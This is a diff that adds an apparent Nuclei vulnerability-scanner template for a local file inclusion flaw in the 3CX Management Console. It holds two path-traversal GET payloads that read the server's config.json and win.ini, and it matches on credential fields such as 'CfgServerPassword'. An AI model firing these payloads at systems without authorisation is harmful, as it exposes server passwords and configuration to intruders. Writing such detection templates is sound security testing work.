@@ -1,0 +1,33 @@
+id: 3cx-management-console
+
+info:
+  name: 3CX Management Console - Local File Inclusion
+  author: HuanXiong
+  severity: high
+
+  tags: File Inclusion
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/Electron/download/windows/..\..\..\Http\webroot\config.json'
+      - '{{BaseURL}}/Electron/download/windows/\windows\win.ini'
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "CfgServerPassword"
+          - "CfgServerAppName"
+        condition: and
+
+      - type: word
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+
